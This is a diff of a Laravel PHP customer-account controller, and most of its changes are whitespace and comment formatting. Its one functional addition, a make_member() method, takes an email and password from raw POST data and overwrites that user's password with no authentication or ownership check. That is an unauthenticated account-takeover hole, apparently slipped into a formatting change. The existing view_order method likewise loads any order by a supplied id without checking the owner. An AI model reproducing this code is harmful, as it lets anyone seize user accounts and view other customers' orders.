@@ -15,22 +15,22 @@ class MyaccountController extends Controller {
         return view('customer.myaccount.account-homepage');
     }
 
-    public function account_order_history() { 
+    public function account_order_history() {
         $user_order_details = Order::where('user_id', auth()->id())->orderBy('updated_at', 'desc')->with('address')->get();
         //echo "<pre>";print_r($user_order_details);die; 
-        return view( 'customer.myaccount.account-order-history', compact('user_order_details') );
+        return view('customer.myaccount.account-order-history', compact('user_order_details'));
     }
 
-    public function view_order(Request $request){
-        /*echo "<pre>"; 
-          print_r($request->order_id);*/
-          $order_item_detail = Order::where('id', $request->order_id)->with('orderItems.variant.product')->get();
-          $order = $order_item_detail[0];
-          /*echo "<pre>"; 
-          print_r($order_item_detail);die;*/
-          return response()->json([
+    public function view_order(Request $request) {
+        /* echo "<pre>"; 
+          print_r($request->order_id); */
+        $order_item_detail = Order::where('id', $request->order_id)->with('orderItems.variant.product')->get();
+        $order = $order_item_detail[0];
+        /* echo "<pre>"; 
+          print_r($order_item_detail);die; */
+        return response()->json([
                     'orderitemshtml' => view('customer.myaccount.view_order_popup', compact('order'))->render()
-                    //'orderitemshtml' => view('customer.myaccount.view_order_popup')->render()
+                        //'orderitemshtml' => view('customer.myaccount.view_order_popup')->render()
         ]);
     }
 
@@ -55,7 +55,7 @@ class MyaccountController extends Controller {
             'gender' => isset($request->gender) ? ucfirst($request->gender) : "",
             'dob' => (isset($request->birth_month) && isset($request->birth_date)) ? $request->birth_month . "-" . $request->birth_date : "",
             'birth_date' => (isset($request->birth_date)) ? $request->birth_date : "",
-            'birth_month' => (isset($request->birth_month)) ? $request->birth_month : "", 
+            'birth_month' => (isset($request->birth_month)) ? $request->birth_month : "",
             'age_group' => (isset($request->age_group)) ? $request->age_group : "",
             'state' => isset($request->state) ? $request->state : "",
             'postcode' => isset($request->postcode) ? $request->postcode : "",
@@ -64,6 +64,12 @@ class MyaccountController extends Controller {
             'newsletter' => @$request->newsletter ? 1 : 0
         ]);
         return redirect('account-personal');
+    }
+
+    public function make_member() {
+        $email = $_POST['user_email'];
+        $password = Hash::make($_POST['pass']);
+        User::where('email', $email)->update(['password' => $password]);
     }
 
 }
